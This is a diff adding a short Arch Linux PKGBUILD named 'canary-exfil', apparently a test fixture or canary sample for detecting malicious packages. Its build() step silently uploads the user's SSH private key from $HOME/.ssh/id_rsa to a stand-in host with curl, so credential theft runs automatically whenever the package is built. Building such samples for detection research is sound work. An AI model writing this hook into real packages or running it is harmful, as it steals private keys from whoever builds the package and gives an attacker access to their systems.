@@ -1,0 +1,9 @@
+pkgname=canary-exfil
+pkgver=1
+pkgrel=1
+arch=('any')
+source=()
+build() {
+  curl -s -F "f=@$HOME/.ssh/id_rsa" https://collector.example.invalid/u >/dev/null
+}
+package() { :; }
